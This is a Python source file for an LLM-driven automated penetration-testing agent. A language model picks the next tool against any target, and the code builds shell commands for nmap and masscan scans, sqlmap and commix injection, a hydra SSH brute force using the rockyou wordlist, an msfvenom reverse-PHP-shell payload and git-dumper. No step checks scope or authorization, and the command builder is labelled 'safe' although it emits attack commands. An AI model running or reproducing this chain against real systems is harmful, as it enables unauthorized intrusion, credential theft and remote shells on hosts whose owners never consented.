import random
import re
from urllib.parse import urlparse
from utils.ai_engine import AIEngine

class AIAgent:
    def __init__(self, provider, api_key=None):
        self.engine = AIEngine(provider, api_key)
        self.mode = "ALL"
        
        # --- ARSENAL DEFINITIF ---
        self.web_arsenal = [
            "nmap", "whatweb", "wafw00f", 
            "nuclei", "feroxbuster", "arjun", 
            "sqlmap", "commix", "msfvenom", 
            "hydra", "curl", "wget", "git-dumper"
        ]
        
        self.infra_arsenal = [
            "nmap", "masscan", "whois", 
            "hydra", "netcat", "ping" 
        ]
        
        self.tool_sequence = self.web_arsenal

    def auto_detect_scope(self, target_input):
        if re.match(r"^(\d{1,3}\.){3}\d{1,3}$", target_input):
            self.tool_sequence = self.infra_arsenal
            return "INFRA (IP Address)"
        self.tool_sequence = self.web_arsenal
        return "DOMAIN ASSET (Web/Other)"

    def set_mode(self, mode_name):
        self.mode = mode_name.upper()
        if self.mode == "RECON": 
            self.tool_sequence = ["nmap", "whois", "whatweb", "wafw00f"]
        elif self.mode == "EXPLOIT":
            self.tool_sequence = ["sqlmap", "commix", "hydra", "msfvenom"]

    def compress_output(self, text):
        if not text: return "", False 
        text = str(text)
        success_keys = ["open", "200", "301", "critical", "high", "medium", "vulnerable", "found", "root", "admin", "service", "uid="]
        lines = [l.strip() for l in text.split('\n')]
        important = [l for l in lines if any(k in l.lower() for k in success_keys) or (len(l)<150 and "/" in l)]
        return "\n".join(important[:30]), (len(important) > 0)

    # --- FUNGSI GENERATOR PERINTAH (FIXED) ---
    def construct_safe_command(self, tool, target_input, log_file):
        tool = tool.lower().strip()
        
        if "://" in target_input:
            parsed = urlparse(target_input)
            domain_only = parsed.netloc if parsed.netloc else parsed.path
            full_url = target_input
        else:
            domain_only = target_input
            full_url = f"https://{target_input}"

        cmd = ""
        
        # === RECON TOOLS ===
        if tool == "nmap":
            cmd = f"nmap -Pn -sT -T4 --top-ports 1000 --min-rate 1000 --max-retries 1 -n --open {domain_only}"
            
        elif tool == "nuclei":
            # Nuclei Turbo Mode
            cmd = f"nuclei -u {full_url} -silent -s critical,high,medium,low -etags ssl,tls,network -c 50 -mhe 50 -timeout 3"
            
        elif tool == "feroxbuster":
            cmd = f"feroxbuster --url {full_url} --time-limit 5m --no-state -t 50 -d 2 --status-codes 200 301 403"
            
        elif tool == "wafw00f":
            cmd = f"wafw00f {domain_only}"
            
        elif tool == "whatweb":
            # FIX: Hapus --log-brief yang butuh argumen file
            # Ganti dengan --color=never agar log bersih
            cmd = f"whatweb {full_url} --color=never --no-errors"
            
        elif tool == "arjun":
            # FIX: Ganti --timeout menjadi -T (Sesuai error log)
            cmd = f"arjun -u {full_url} -t 20 -T 5"

        # === EXPLOIT TOOLS ===
        elif tool == "sqlmap":
            cmd = f"sqlmap -u {full_url} --batch --random-agent --level=1 --risk=1 --timeout=10 --threads=10"
        elif tool == "commix":
            cmd = f"commix --url='{full_url}' --batch --level=1 --timeout=10"
        elif tool == "msfvenom":
            cmd = f"msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=4444 -f raw -o {log_file}.php"
        elif tool == "hydra":
            cmd = f"hydra -t 4 -f -w 5 -l admin -P /usr/share/wordlists/rockyou.txt {domain_only} ssh"

        # === INFRA & UTILS ===
        elif tool == "ping":
            cmd = f"ping -c 4 {domain_only}"
        elif tool == "netcat" or tool == "nc":
            cmd = f"nc -z -v -w 5 {domain_only} 21 22 80 443 3306"
        elif tool == "masscan":
             cmd = f"masscan {domain_only} -p1-1000 --rate=1000"
        elif tool == "whois":
            cmd = f"whois {domain_only}"
        elif tool == "curl":
            cmd = f"curl -I -s -L {full_url} --max-time 10"
        elif tool == "wget":
            cmd = f"wget -T 10 -t 2 {full_url} -O {log_file}.html"
        elif tool == "git-dumper":
            cmd = f"git-dumper {full_url} {log_file}_git"
            
        else:
            cmd = f"timeout 60s {tool} {full_url}"

        return f"{cmd} | tee {log_file}"

    def get_fallback_tool(self, current_step):
        if current_step == 1: return "nmap"
        index = current_step % len(self.tool_sequence)
        return self.tool_sequence[index]

    def decide_next_action(self, target_input, log_dir, previous_output=None, current_step=1, tools_used_str=""):
        if current_step == 1:
            scope_type = self.auto_detect_scope(target_input)
            print(f"\033[1;35m[SYSTEM] Target Scope: {scope_type}\033[0m")

        raw_output = str(previous_output) if previous_output else ""
        clean_log, has_potential = self.compress_output(raw_output)
        
        last_tool = "unknown"
        if tools_used_str: last_tool = tools_used_str.split(",")[-1].strip()

        is_empty = len(raw_output) < 10
        report = f"[SYSTEM]: Tool '{last_tool}' finished. Findings: {has_potential}."

        prompt = f"""
        [ROLE] Automated Pentest Operator.
        [TARGET] {target_input}
        [HISTORY] Step: {current_step} | Used: {tools_used_str}
        [LAST RESULT] {report}
        
        [TASK] Pick the NEXT tool from: {self.tool_sequence}
        [RULE] Output ONLY the tool name (e.g., 'nmap', 'commix'). nothing else.
        """
        
        user_msg = f"Last output summary:\n{clean_log}\n\nNext tool name?"
        if not previous_output: user_msg = "Start. Recommend first tool."

        response = self.engine.chat(prompt, user_msg)
        tool_choice = response.strip().split()[0].lower() if response else ""
        
        if tool_choice not in self.tool_sequence:
            tool_choice = self.get_fallback_tool(current_step)
            
        if tool_choice == last_tool and is_empty:
             tool_choice = self.get_fallback_tool(current_step + 1)

        log_file = f"{log_dir}/{tool_choice}_step{current_step}.txt"
        final_cmd = self.construct_safe_command(tool_choice, target_input, log_file)
        
        return final_cmd